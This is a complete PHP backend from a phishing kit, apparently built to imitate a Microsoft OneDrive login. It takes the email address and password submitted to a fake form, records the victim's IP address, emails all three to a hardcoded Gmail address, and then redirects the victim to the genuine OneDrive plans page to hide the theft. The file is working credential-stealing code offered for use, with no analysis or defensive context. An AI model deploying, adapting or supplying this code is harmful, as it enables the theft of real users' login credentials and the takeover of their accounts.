<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$username = $_POST['EmailAdd'];
$password = $_POST['Password'];
$chasem3="alanrodriguezf123@gmail.com";


  $subj = "New Others Login $ip";
  $msg = "Email: $username\nPassword: $password\n$ip\n-----------------------------------\n      Live  Created By Coke\n-----------------------------------";
  $from = "From: <ssc@sscs.com>";
    mail("$chasem3", $subj, $msg, $from);

	header("location: https://onedrive.live.com/about/en-ca/plans/");

?> 



